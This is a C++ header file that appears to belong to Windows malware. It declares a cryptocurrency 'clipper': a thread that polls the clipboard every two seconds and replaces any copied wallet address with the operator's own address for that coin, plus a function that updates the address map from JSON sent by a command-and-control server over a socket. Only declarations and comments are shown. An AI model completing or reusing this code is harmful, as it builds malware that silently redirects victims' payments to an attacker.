#pragma once
#include <winsock2.h>
#include <windows.h>
#include <string>

// Start the clipboard monitor thread. Polls every 2 seconds and replaces
// any detected crypto address with the operator's saved address for that coin.
void StartClipperThread(SOCKET sock);

// Stop the clipboard monitor thread (called on disconnect/shutdown).
void StopClipperThread();

// Update the in-memory address map from a JSON string pushed by the C2.
// Format: {"BTC":"addr","ETH":"addr",...}
void UpdateClipperAddresses(const std::string& jsonAddresses);
